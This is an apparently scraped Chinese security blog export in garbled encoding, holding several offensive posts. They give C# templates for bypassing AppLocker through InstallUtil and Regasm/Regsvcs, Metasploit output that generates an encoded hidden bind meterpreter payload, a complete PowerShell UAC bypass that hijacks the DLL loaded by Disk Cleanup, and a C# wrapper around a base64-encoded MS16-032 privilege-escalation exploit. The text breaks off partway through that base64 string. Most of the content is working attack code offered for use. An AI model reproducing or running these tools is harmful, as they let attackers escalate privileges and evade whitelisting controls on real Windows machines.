1ã€é€šè¿‡.Netæ‰§è¡Œpowershellé€šè¿‡.Netæ‰§è¡Œpowershellè¿›è¡Œç»•è¿‡ï¼š C# templaepowershell.cs123456789101112131415using System;using System.Management.Automation;namespace Powershell&#123; class Program &#123; static void Main(string[] args) &#123; PowerShell ps = PowerShell.Create(); ps.AddCommand("Invoke-Expression"); ps.AddArgument("payload"); ps.Invoke(); &#125; &#125;&#125; ç¼–è¯‘exeä»¥åä¸èƒ½ç›´æ¥è¿è¡Œï¼Œå¯ä»¥æ”¾åˆ°å¯æ‰§è¡Œç›®å½•æ‰§è¡Œ,è°ƒç”¨powershellã€‚ 2ã€InstallUtil å‚è€ƒ1ï¼šhttp://drops.wooyun.org/tips/8862 å‚è€ƒ2: http://drops.wooyun.org/tips/8701 InstallUtil.cs123456789101112131415161718192021222324using System;using System.Management.Automation;namespace Whitelist&#123; class Program &#123; static void Main(string[] args) &#123; &#125; &#125;&#125;[System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer &#123; //The Methods can be Uninstall/Install. Install is transactional, and really unnecessary. public override void Uninstall(System.Collections.IDictionary savedState) &#123; PowerShell ps = PowerShell.Create(); ps.AddCommand("Invoke-Expression"); ps.AddArgument("payload"); ps.Invoke(); &#125; &#125; ç¼–è¯‘ä»¥åç”¨/Uå‚æ•°è¿è¡Œï¼š12C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:InstallUtil.exe InstallUtil.csC:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U InstallUtil.exe 3ã€Regasm &amp; Regsvcs Regasm.cs12345678910111213141516171819202122using System;using System.EnterpriseServices;using System.Runtime.InteropServices;using System.Management.Automation;namespace regsvcser&#123; public class Bypass : ServicedComponent &#123; public Bypass() &#123; Console.WriteLine("I am a basic COM Object"); &#125; [ComUnregisterFunction] //This executes if registration fails public static void UnRegisterClass ( string key ) &#123; PowerShell ps = PowerShell.Create(); ps.AddCommand("Invoke-Expression"); ps.AddArgument("payload"); ps.Invoke(); &#125; &#125;&#125; ä½¿ç”¨æ–¹å¼ä¸ºï¼š12345678910111213141516Create Your Strong Name Key -&gt; key.snk$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='$Content = [System.Convert]::FromBase64String($key)Set-Content key.snk -Value $Content -Encoding ByteC:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:Regasm.dll /keyfile:key.snk Regasm.csC:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Regasm.dll [OR]C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe Regasm.dll //Executes UnRegisterClass If you don't have permissionsC:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U Regasm.dll C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U Regasm.dll //This calls the UnregisterClass Method 4ã€nishang æ–‡ä»¶backdoorè™½ç„¶powershellè¢«ç¦ç”¨äº†ï¼Œä½†æ˜¯ä»ç„¶å¯æ‰§è¡Œshellcodeã€‚å¯ä»¥ä½¿ç”¨hta,macroç­‰æ–¹å¼è¿›è¡Œã€‚ 0x03 ææƒææƒåˆ°ç®¡ç†å‘˜æƒé™ï¼Œå³å¯æ‰§è¡Œçªç ´AppLockerçš„é™åˆ¶ï¼Œæ‰§è¡Œexeå’Œè„šæœ¬]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>applocker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shellter Custom payload]]></title>
    <url>%2Farchives%2FShellter_Custom_payload.html</url>
    <content type="text"><![CDATA[12345678910111213141516msf &gt; show payloadsmsf &gt; use windows/meterpreter/bind_hidden_ipknock_tcpmsf payload(bind_hidden_ipknock_tcp) &gt; show options Module options (payload/windows/meterpreter/bind_hidden_ipknock_tcp):Name Current Setting Required Description---- --------------- -------- -----------EXITFUNC process yes Exit technique (Accepted: , , seh, thread, process, none)KHOST yes IP address allowedLPORT 4444 yes The listen portRHOST no The target addressmsf payload(bind_hidden_ipknock_tcp) &gt; set EXITFUNC threadmsf payload(bind_hidden_ipknock_tcp) &gt; set KHOST 8.8.8.8msf payload(bind_hidden_ipknock_tcp) &gt; set LPORT 5555msf payload(bind_hidden_ipknock_tcp) &gt; generate -E -e x86/shikata_ga_nai -t raw -f custom_payload[*] Writing 386 bytes to custom_payload...]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[BypassUac On Win10 Using Disk Cleanup]]></title>
    <url>%2Farchives%2FBypassUAC_on_Win10_Using_Disk_Cleanup.html</url>
    <content type="text"><![CDATA[æœ€è¿‘çœ‹åˆ°enigma0x3åšå®¢ä¸Šåˆ†äº«äº†ä¸€ç§é€šè¿‡Disk Cleanupè®¡åˆ’ä»»åŠ¡è¿›è¡Œbypassuacçš„å§¿åŠ¿ï¼Œæ„Ÿè§‰è¿˜æ˜¯ä¸é”™çš„ï¼Œæ‰€ä»¥åœ¨è¿™å„¿åˆ†äº«ä¸€ä¸‹ã€‚åŸæ–‡åœ¨è¿™é‡Œ æˆ³æˆ‘å…³äºBypassUACå·¥å…·å·²ç»å¾ˆå¤šäº†ï¼Œæœ‰ä¸ªéå¸¸ä¸é”™çš„å·¥å…· UACME ç®€å•çš„è¯´ä¸€ä¸‹é€šè¿‡Disk Cleanupè¿›è¡Œbypassuacçš„åŸç†ã€‚ Win10æœ‰ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡å«åšSilentCleanup,å…·ä½“ä½ç½®åœ¨\Microsoft\Windows\DiskCleanup è¿™ä¸ªè®¡åˆ’ä»»åŠ¡æ˜¯ä¼šä½¿ç”¨æœ€é«˜æƒé™è¿è¡Œç¨‹åºçš„ï¼Œè€ŒåŠ è½½æ­¤è®¡åˆ’ä»»åŠ¡ä¸éœ€è¦æœ€é«˜æƒé™ã€‚ æ­¤ä»»åŠ¡æ‰§è¡Œä¼šè¿è¡Œcleanmgr.exeï¼Œè€Œä¸”ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹â€œC:\Users\&lt;username&gt;\AppData\Local\Temp\&lt;GUID&gt;â€å¹¶å°†dismhost.exeä»¥åŠå…¶ä½¿ç”¨çš„ç›¸å…³DLLæ–‡ä»¶å¤åˆ¶åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢ã€‚ å½“dismhost.exeè¿è¡Œæ—¶ï¼Œä¼šåŠ è½½å…¶è¦ä½¿ç”¨çš„DLLæ–‡ä»¶ï¼Œç”±äºå½“å‰ç›®å½•æ˜¯åœ¨%TEMP%ï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥è¿›è¡ŒDLLåŠ«æŒï¼Œæµ‹è¯•å‘ç°LogProvider.dllæ˜¯æœ€åä¸€ä¸ªåŠ è½½çš„DLLï¼Œå¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨ï¼Œæ‰€ä»¥åªéœ€è¦æŠŠè¿™ä¸ªDLLæ›¿æ¢æˆæˆ‘ä»¬çš„æ¶æ„DLLï¼Œé‚£ä¹ˆè¿™ä¸ªè®¡åˆ’ä»»åŠ¡è¿è¡Œçš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„DLLå°±ä¼šè¢«åŠ è½½ï¼Œè¾¾åˆ°BypassUACçš„ç›®çš„ã€‚ä¸ºäº†èƒ½é©¬ä¸Šè¿›è¡ŒBypassUACï¼Œå¯ä»¥ä½¿ç”¨WMIæ¥è¿è¡Œè¿™ä¸ªè®¡åˆ’ä»»åŠ¡ã€‚ä½œè€…å·²ç»ç»™å‡ºäº†åˆ©ç”¨è„šæœ¬ï¼Œé“¾æ¥ BypassUAC , æµ‹è¯•DLLé“¾æ¥ï¼šMessageBoxã€‚ æœ‰å…´è¶£çš„æµ‹æµ‹çœ‹å§~ ä½œè€…ä»£ç è¢«å¢™äº†ï¼Œè´´åœ¨äº†ä¸‹é¢:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899function Invoke-UACBypass &#123;&lt;#.SYNOPSISBypasses UAC on Windows 10 by abusing the SilentCleanup task to win a race condition, allowing for a DLL hijack without a privileged file copy.Author: Matthew Graeber (@mattifestation), Matt Nelson (@enigma0x3)License: BSD 3-ClauseRequired Dependencies: NoneOptional Dependencies: None.PARAMETER DllPathSpecifies the path to the DLL you want executed in a high integrity context. Be mindful of the architecture of the DLL. It must match that of %SystemRoot%\System32\Dism\LogProvider.dll..EXAMPLEInvoke-UACBypass -DllPath C:\Users\TestUser\Desktop\Win10UACBypass\PrivescTest.dll.EXAMPLEInvoke-UACBypass -DllPath C:\Users\TestUser\Desktop\TotallyLegit.txt -VerboseThe DllPath can have any extension as long as the file itself is a DLL.#&gt; [CmdletBinding()] [OutputType([System.IO.FileInfo])] Param ( [Parameter(Mandatory = $True)] [String] [ValidateScript(&#123; Test-Path $_ &#125;)] $DllPath ) $PrivescAction = &#123; $ReplacementDllPath = $Event.MessageData.DllPath # The newly created GUID folder $DismHostFolder = $EventArgs.NewEvent.TargetInstance.Name $OriginalPreference = $VerbosePreference # Force -Verbose to display in the event if ($Event.MessageData.VerboseSet -eq $True) &#123; $VerbosePreference = 'Continue' &#125; Write-Verbose "DismHost folder created in $DismHostFolder" Write-Verbose "$ReplacementDllPath to $DismHostFolder\LogProvider.dll" try &#123; $FileInfo = Copy-Item -Path $ReplacementDllPath -Destination "$DismHostFolder\LogProvider.dll" -Force -PassThru -ErrorAction Stop &#125; catch &#123; Write-Warning "Error copying file! Message: $_" &#125; # Restore the event preference $VerbosePreference = $OriginalPreference if ($FileInfo) &#123; # Trigger Wait-Event to return and indicate success. New-Event -SourceIdentifier 'DllPlantedSuccess' -MessageData $FileInfo &#125; &#125; $VerboseSet = $False if ($PSBoundParameters['Verbose']) &#123; $VerboseSet = $True &#125; $MessageData = New-Object -TypeName PSObject -Property @&#123; DllPath = $DllPath VerboseSet = $VerboseSet # Pass the verbose preference to the scriptblock since # event scriptblocks will not automatically honor -Verbose. &#125; $TempDrive = $Env:TEMP.Substring(0,2) # Trigger the DLL dropper with the following conditions: # 1) A directory is created - i.e. new Win32_Directory instance # 2) The directory created is created under %TEMP% # 3) The directory name is in the form of a GUID $TempFolderCreationEvent = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA `"Win32_Directory`" AND TargetInstance.Drive = `"$TempDrive`" AND TargetInstance.Path = `"$($Env:TEMP.Substring(2).Replace('\', '\\'))\\`" AND TargetInstance.FileName LIKE `"________-____-____-____-____________`"" $TempFolderWatcher = Register-WmiEvent -Query $TempFolderCreationEvent -Action $PrivescAction -MessageData $MessageData # We need to jump through these hoops to properly capture stdout and stderr of schtasks. $StartInfo = New-Object Diagnostics.ProcessStartInfo $StartInfo.FileName = 'schtasks' $StartInfo.Arguments = '/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I' $StartInfo.RedirectStandardError = $True $StartInfo.RedirectStandardOutput = $True $StartInfo.UseShellExecute = $False $Process = New-Object Diagnostics.Process $Process.StartInfo = $StartInfo $null = $Process.Start() $Process.WaitForExit() $Stdout = $Process.StandardOutput.ReadToEnd().Trim() $Stderr = $Process.StandardError.ReadToEnd().Trim() if ($Stderr) &#123; Unregister-Event -SubscriptionId $TempFolderWatcher.Id throw "SilentCleanup task failed to execute. Error message: $Stderr" &#125; else &#123; if ($Stdout.Contains('is currently running')) &#123; Unregister-Event -SubscriptionId $TempFolderWatcher.Id Write-Warning 'SilentCleanup task is already running. Please wait until the task has completed.' &#125; Write-Verbose "SilentCleanup task executed successfully. Message: $Stdout" &#125; $PayloadExecutedEvent = Wait-Event -SourceIdentifier 'DllPlantedSuccess' -Timeout 10 Unregister-Event -SubscriptionId $TempFolderWatcher.Id if ($PayloadExecutedEvent) &#123; Write-Verbose 'UAC bypass was successful!' # Output the file info for the DLL that was planted $PayloadExecutedEvent.MessageData $PayloadExecutedEvent | Remove-Event &#125; else &#123; # The event timed out. Write-Error 'UAC bypass failed. The DLL was not planted in its target.' &#125;&#125;]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ç¼–è¯‘ä½ çš„Powershell( MS16-032ä¸ºä¾‹)]]></title>
    <url>%2Farchives%2FCompile_Your_Powreshell_Script.html</url>
    <content type="text"><![CDATA[æˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸” ä¹‹å‰çš„MS16-032æ˜¯ä¸ªpowershellè„šæœ¬ï¼Œæ€ä¹ˆæ ·æ”¹æˆexeå‘¢ï¼Œå¾ˆç®€å•ã€‚ä½¿ç”¨.netç›´æ¥ç®€å•çš„ä¿®æ”¹ç¼–è¯‘å°±å¯ä»¥äº†ã€‚å·²ç»æ”¹å¥½çš„ä»£ç åœ¨è¿™é‡Œï¼š æˆ³æˆ‘ gistè²Œä¼¼è¢«å¢™äº†ï¼Œæˆ‘åœ¨è¿™é‡Œä¹Ÿè´´ä¸€ä¸‹ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/*Author: Evilcg, Twitter: @EvilcgStep One:PS C:\&gt; [psobject].Assembly.LocationC:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dllStep Two:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:MS16_032.exe MS16_032.cs*/// Windows 10 reference may be Here: C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35using System;using System.IO;using System.Collections.Generic;using System.Collections.ObjectModel;using System.Text;using System.Threading.Tasks;using System.Management.Automation;using System.Management.Automation.Host;using System.Management.Automation.Runspaces;namespace ConsoleApplication1&#123; class Program &#123; static string _application; static string _commandline; static int Main(string[] args) &#123; if (args.Length == 0) &#123; System.Console.WriteLine("Usage: MS16_032.exe calc.exe OR MS16_032.exe cmd.exe \"/c clac.exe\""); return 1; &#125; else if (args.Length ==1) &#123; _application = args[0]; PowerShellExecutor t = new PowerShellExecutor(); t.ExecuteSynchronously(_application, ""); &#125; else if(args.Length == 2) &#123; _application = args[0]; _commandline = args[1]; PowerShellExecutor t = new PowerShellExecutor(); t.ExecuteSynchronously(_application, _commandline); &#125; return 0; &#125; &#125; class PowerShellExecutor &#123; public static string PSInvoke_MS16_032 = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gSW52b2tlLU1TMTYtMDMyIHsKPCMKLlNZTk9QU0lTCiAgICAKICAgIFBvd2VyU2hlbGwgaW1wbGVtZW50YXRpb24gb2YgTVMxNi0wMzIuIFRoZSBleHBsb2l0IHRhcmdldHMgYWxsIHZ1bG5lcmFibGUKICAgIG9wZXJhdGluZyBzeXN0ZW1zIHRoYXQgc3VwcG9ydCBQb3dlclNoZWxsIHYyKy4gQ3JlZGl0IGZvciB0aGUgZGlzY292ZXJ5IG9mCiAgICB0aGUgYnVnIGFuZCB0aGUgbG9naWMgdG8gZXhwbG9pdCBpdCBnbyB0byBKYW1lcyBGb3JzaGF3IChAdGlyYW5pZGRvKS4KICAgIAogICAgVGFyZ2V0czoKICAgIAogICAgKiBXaW43LVdpbjEwICYgMms4LTJrMTIgPD09IDMyLzY0IGJpdCEKICAgICogVGVzdGVkIG9uIHgzMiBXaW43LCB4NjQgV2luOCwgeDY0IDJrMTJSMgogICAgCiAgICBOb3RlczoKICAgIAogICAgKiBJbiBvcmRlciBmb3IgdGhlIHJhY2UgY29uZGl0aW9uIHRvIHN1Y2NlZWQgdGhlIG1hY2hpbmUgbXVzdCBoYXZlIDIrIENQVQogICAgICBjb3Jlcy4gSWYgdGVzdGluZyBpbiBhIFZNIGp1c3QgbWFrZSBzdXJlIHRvIGFkZCBhIGNvcmUgaWYgbmVlZGVkIG1rYXkuCiAgICAqIFRoZSBleHBsb2l0IGlzIHByZXR0eSByZWxpYWJsZSwgaG93ZXZlciB+MS82IHRpbWVzIGl0IHdpbGwgc2F5IGl0IHN1Y2NlZWRlZAogICAgICBidXQgbm90IHNwYXduIGEgc2hlbGwuIE5vdCBzdXJlIHdoYXQgdGhlIGlzc3VlIGlzIGJ1dCBqdXN0IHJlLXJ1biBhbmQgcHJvZml0IQogICAgKiBXYW50IHRvIGtub3cgbW9yZSBhYm91dCBNUzE2LTAzMiA9PT4KICAgICAgaHR0cHM6Ly9nb29nbGVwcm9qZWN0emVyby5ibG9nc3BvdC5jby51ay8yMDE2LzAzL2V4cGxvaXRpbmctbGVha2VkLXRocmVhZC1oYW5kbGUuaHRtbAoKLkRFU0NSSVBUSU9OCiAgICBBdXRob3I6IFJ1YmVuIEJvb25lbiAoQEZ1enp5U2VjKQogICAgQmxvZzogaHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS8KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBQb3dlclNoZWxsIHYyKwogICAgT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCgouUEFSQU1FVEVSIEFwcGxpY2F0aW9uCgpTcGVjaWZpZXMgYW4gQXBwbGljYXRpb24gdG8gcnVuLgoKLlBBUkFNRVRFUiBDb21tYW5kbGluZQoKU3BlY2lmaWVzIENvbW1hbmRsaW5lLCBzdWNoIGFzIG5ldCB1c2VyIHh4eCB4eHggL2FkZAogICAgCi5FWEFNUExFCiAgICBDOlxQUz4gSW52b2tlLU1TMTYtMDMyIC1BcHBsaWNhdGlvbiBDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUKICAgIEM6XFBTPiBJbnZva2UtTVMxNi0wMzIgLUFwcGxpY2F0aW9uIEM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSAtQ29tbWFuZGxpbmUgIi9jIG5ldCB1c2VyIDEgMSAvYWRkIgoKIz4KICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlclNldE5hbWUgPSAnQzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhlJyApXQogICAgICAgIFtzdHJpbmddCiAgICAgICAgJEFwcGxpY2F0aW9uLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkQ29tbWFuZGxpbmUKICAgICAgICApCgoKICAgIEFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiBAIgogICAgdXNpbmcgU3lzdGVtOwogICAgdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwogICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwogICAgdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKICAgIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CiAgICAKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0PUNoYXJTZXQuVW5pY29kZSldCiAgICBwdWJsaWMgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIEludDMyIGNiOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgcHVibGljIEludDMyIGR3WDsKICAgICAgICBwdWJsaWMgSW50MzIgZHdZOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIEludDMyIGR3RmxhZ3M7CiAgICAgICAgcHVibGljIEludDE2IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBJbnQxNiBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KICAgIAogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBTUU9TCiAgICB7CiAgICAgICAgcHVibGljIGludCBMZW5ndGg7CiAgICAgICAgcHVibGljIGludCBJbXBlcnNvbmF0aW9uTGV2ZWw7CiAgICAgICAgcHVibGljIGludCBDb250ZXh0VHJhY2tpbmdNb2RlOwogICAgICAgIHB1YmxpYyBib29sIEVmZmVjdGl2ZU9ubHk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgQWR2YXBpMzIKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSwgQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcoCiAgICAgICAgICAgIFN0cmluZyB1c2VyTmFtZSwKICAgICAgICAgICAgU3RyaW5nIGRvbWFpbiwKICAgICAgICAgICAgU3RyaW5nIHBhc3N3b3JkLAogICAgICAgICAgICBpbnQgbG9nb25GbGFncywKICAgICAgICAgICAgU3RyaW5nIGFwcGxpY2F0aW9uTmFtZSwKICAgICAgICAgICAgU3RyaW5nIGNvbW1hbmRMaW5lLAogICAgICAgICAgICBpbnQgY3JlYXRpb25GbGFncywKICAgICAgICAgICAgaW50IGVudmlyb25tZW50LAogICAgICAgICAgICBTdHJpbmcgY3VycmVudERpcmVjdG9yeSwKICAgICAgICAgICAgcmVmICBTVEFSVFVQSU5GTyBzdGFydHVwSW5mbywKICAgICAgICAgICAgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gcHJvY2Vzc0luZm9ybWF0aW9uKTsKICAgICAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0VGhyZWFkVG9rZW4oCiAgICAgICAgICAgIHJlZiBJbnRQdHIgVGhyZWFkLAogICAgICAgICAgICBJbnRQdHIgVG9rZW4pOwogICAgICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuVGhyZWFkVG9rZW4oCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRIYW5kbGUsCiAgICAgICAgICAgIGludCBEZXNpcmVkQWNjZXNzLAogICAgICAgICAgICBib29sIE9wZW5Bc1NlbGYsCiAgICAgICAgICAgIG91dCBJbnRQdHIgVG9rZW5IYW5kbGUpOwogICAgICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBPcGVuUHJvY2Vzc1Rva2VuKAogICAgICAgICAgICBJbnRQdHIgUHJvY2Vzc0hhbmRsZSwgCiAgICAgICAgICAgIGludCBEZXNpcmVkQWNjZXNzLAogICAgICAgICAgICByZWYgSW50UHRyIFRva2VuSGFuZGxlKTsKICAgICAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBleHRlcm4gc3RhdGljIGJvb2wgRHVwbGljYXRlVG9rZW4oCiAgICAgICAgICAgIEludFB0ciBFeGlzdGluZ1Rva2VuSGFuZGxlLAogICAgICAgICAgICBpbnQgU0VDVVJJVFlfSU1QRVJTT05BVElPTl9MRVZFTCwKICAgICAgICAgICAgcmVmIEludFB0ciBEdXBsaWNhdGVUb2tlbkhhbmRsZSk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgS2VybmVsMzIKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IEdldExhc3RFcnJvcigpOwogICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwogICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50VGhyZWFkKCk7CiAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRUaHJlYWRJZChJbnRQdHIgaFRocmVhZCk7CiAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldFByb2Nlc3NJZE9mVGhyZWFkKEludFB0ciBoYW5kbGUpOwogICAgICAgIAogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsU2V0TGFzdEVycm9yPXRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBTdXNwZW5kVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLFNldExhc3RFcnJvcj10cnVlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVzdW1lVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBUZXJtaW5hdGVQcm9jZXNzKAogICAgICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgICAgIHVpbnQgdUV4aXRDb2RlKTsKICAgIAogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENsb3NlSGFuZGxlKEludFB0ci